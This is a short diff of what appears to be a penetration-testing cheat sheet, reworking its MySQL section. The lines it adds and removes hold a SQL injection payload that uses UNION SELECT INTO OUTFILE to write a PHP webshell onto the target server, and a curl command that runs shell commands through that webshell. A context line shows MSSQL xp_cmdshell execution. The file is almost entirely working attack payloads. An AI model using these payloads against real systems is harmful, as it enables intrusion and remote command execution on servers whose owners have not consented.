@@ -14,10 +14,13 @@ SQL> EXECUTE xp_cmdshell 'whoami';
 
 ## MySQL
 
+Injection:
 ```
-' UNION SELECT "<?php system($_GET['cmd']);?>", null, ..., null INTO OUTFILE "/path/webshell.php" -- //
-
-curl ip/path/webshell.php?cmd=ls
+' UNION SELECT "<?php system($_GET['cmd']);?>", null, ..., null INTO OUTFILE "/path/on/target/webshell.php" -- //
+```
+and trigger the webshell:
+```
+curl $TargetIp/path/on/target/webshell.php?cmd=ls
 ```
 
 ## sqlmap
